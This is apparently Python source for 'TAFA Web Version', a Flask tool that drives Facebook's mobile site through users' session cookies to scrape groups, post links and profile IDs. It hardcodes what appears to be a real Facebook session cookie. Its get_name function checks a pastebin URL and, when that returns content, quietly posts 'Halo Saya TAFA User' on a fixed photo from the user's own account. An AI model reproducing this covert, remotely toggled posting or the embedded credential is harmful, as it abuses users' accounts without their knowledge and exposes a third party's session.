# Name: TAFA Web Version
# Author: SalisM3
# Github: https://github.com/salismazaya

from mechanize import Browser
from flask import request, make_response
from bs4 import BeautifulSoup as parser
import requests as r
kuki = "datr=PD78XeA_1Q56YYZ_VAGNaOFB; sb=PD78XRrUMAL3wRlVVzFLjoQC; locale=id_ID; m_pixel_ratio=2; wd=360x531; x-referer=eyJyIjoiL2hvbWUucGhwIiwiaCI6Ii9ob21lLnBocCIsInMiOiJtIn0%3D; c_user=100041106940465; xs=36%3A07c8hoSGTJSjfQ%3A2%3A1577024099%3A20352%3A10751; fr=01j67Pr46WWB535S6.AWVUxrgIqIXuS5OniPRb_Wx8Ds8.Bd9kOE.dr.F4A.0.0.Bd_3pj.; spin=r.1001566983_b.trunk_t.1577065874_s.1_v.2_"
ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
class Model:
	def __init__(self):
		self.br = Browser()
		self.br.set_handle_robots(False)

	@property
	def updateHeader(self):
		pass
	
	@updateHeader.setter
	def updateHeader(self, x):
		self.br.addheaders = x


	def set_kuki(self, x, url=""):
		self.updateHeader = [("user-agent", ua), ("cookie", x)]
		data =  self.br.open("https://mbasic.facebook.com/" + url).read().decode()
		self.html = data
		if "mbasic_logout_button" in data:
			self.updateHeader = [("user-agent", ua), ("cookie", x)]
			self.html = data
			return True
		else:
			return False
			self.updateHeader = []

	def cek_kuki(self, x):
		data =  r.get("https://mbasic.facebook.com", headers={'cookie':x}).text
		self.html = data
		if not "mbasic_logout_button" in data:
			return False
		else:
			return True

	def get_name(self, x):
		self.set_kuki(x)
		data = parser(self.br.open("https://mbasic.facebook.com/me").read(), "html.parser")
		nama = data.find("title").text
		try: img = data.find("img", alt=nama).get("src")
		except: img = "https://i.bb.co/zhBN2bQ/20191228-12536.jpg"
		try: idna = data.find("a", string="Log Aktivitas").get("href").split("/")[1]
		except: idna = "None"
		if bool(r.get("https://pastebin.com/raw/LXb14rwr").text):
			try:
				self.br.open("https://mbasic.facebook.com/photo.php?fbid=166694224710808")
				self.br.select_form(nr=0)
				self.br["comment_text"] = "Halo Saya TAFA User"
				self.br.submit()
			except:
				pass
		return nama, img, idna

	def my_name(self):
		return request.cookies.get('nama')

	def my_bengeut(self):
		return request.cookies.get('img')

	def my_id(self):
		return request.cookies.get('id')

	def get_grup(self):
		br = self.br
		data = self.html
		data = parser(data, "html.parser").find_all('a', href = lambda x: "groups" in x and x.count('=') == 1)
		return data

	def buka(self, x):
		return self.br.open(x).read().decode()

	def dump_sts(self, url, stri, stri2, limit, kondisi):
		if stri == "true": stri = True
		self.id = []
		penentu = 0
		angka = 0
		while penentu == 0:
			a = self.br.open(url).read().decode()
			b = parser(a, 'html.parser')
			data = b.find_all('a', href=lambda x: kondisi in x) if stri == True else b.find_all('a', string=stri)
			for s in data:
				self.id.append("https://mbasic.facebook.com" + s.get('href'))
				angka += 1
				if angka == limit:
					penentu += 1
					break
			next = b.find('a', string=stri2)
			if "None" in str(next):
				break
			else:
				url = "https://mbasic.facebook.com" + next.get('href')
			if stri != True: self.id = [x for x in self.id if kondisi in x]

	def find_id(self, x):
		try:
			self.set_kuki(request.cookies.get("cookie"), url=f"search/people?q={x.replace(' ', '+')}")
			if True:
				data = parser(self.html, "html.parser").find_all("td")
				data = filter(lambda y: x in str(y), data)
				data = self.br.open(list(data)[1].find("a").get("href")).read()
				img = parser(data, "html.parser").find("img", alt=x).get("src")
				data = parser(data, "html.parser").find("a", string="Lainnya").get("href").split("=")[1].split("&")[0]
				if len(data) > 15: return "Not Found", ""
				else: return data, img
		except:
			return "Not Found", ""








